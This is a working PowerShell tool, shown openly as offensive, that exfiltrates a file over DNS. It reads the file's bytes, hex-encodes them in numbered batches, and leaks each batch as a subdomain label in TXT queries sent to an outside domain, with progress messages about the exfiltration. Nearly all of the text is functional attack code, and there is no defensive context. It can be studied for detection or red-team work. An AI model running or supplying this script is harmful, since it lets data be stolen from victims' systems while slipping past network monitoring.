param(
    [string]$File = "",
    [string]$Domain = "example.com",
    [string]$Subdomain = "subdomain",
    [string]$QueryType = "TXT"
)

# taken from 
# https://stackoverflow.com/questions/48372979/convert-format-hex-powershell-table-to-raw-hex-dump
function ConvertTo-Hex {
    [CmdletBinding()]
    Param(
        [Parameter(
            Position=0,
            Mandatory=$true,
            ValueFromPipeline=$true,
            ValueFromPipelineByPropertyName=$true
        )]
        [int]$InputObject
    )

    $hex = [char[]]$InputObject |
           ForEach-Object { '{0:x2}' -f [int]$_ }

    if ($hex -ne $null) {
        return (-join $hex)
    }
}

# function for performing DNS query
function Send-Data {
    Param(
        $exfilString
    )

    foreach ($c in $hex) {
        $exfilString += $c;
    }
    if ($exfilString -ne "$batch-") {
        $DomainToQuery = "$exfilString.$Subdomain.$Domain"
        Write-Host "[*] querying $DomainToQuery"
        Resolve-DnsName -type $QueryType $DomainToQuery -QuickTimeout -erroraction 'silentlycontinue'
    }
}


Write-Host "[*] exfiltrating file $File"
$bytes = [System.IO.File]::ReadAllBytes($File);
$numBytes = $bytes.Count;
$numQueries = [math]::Ceiling($bytes.Count / 64);
Write-Host  "[*] read $numBytes bytes, exfiltration will take $numQueries queries"
$hex = New-Object System.Collections.Generic.List[System.Object];

Write-Host  "[*] starting exfiltration"
$hex = New-Object System.Collections.Generic.List[System.Object];
$batch = 0;
$exfilLength = 63;
$exfilString = "$batch-";
$exfilHexBytes = [math]::Floor(($exfilLength - $exfilString.Length) / 2);
foreach ($b in $bytes)
{   
    $h = ConvertTo-Hex $b;
    #echo $b" - "$h;
    $hex.Add($h);
    
    if($hex.Count -eq $exfilHexBytes) {
        Send-Data $exfilString

        #foreach ($c in $hex) {
        #    $exfilString += $c;
        #}
        #if ($exfilString -ne "$batch-") {
        #    $DomainToQuery = "$exfilString.$Subdomain.$Domain"
        #    Write-Host "[*] querying $DomainToQuery"
        #    Resolve-DnsName -type $QueryType $DomainToQuery -QuickTimeout -erroraction 'silentlycontinue'
        #}
        $hex.Clear();
        $batch += 1;
        $exfilString = "$batch-";
        $exfilHexBytes = [math]::Floor(($exfilLength - $exfilString.Length) / 2);
    }
}

# one last send
if ($hex.Count -gt 0) {
    Send-Data $exfilString
}

Write-Host  "[*] done exfiltration"
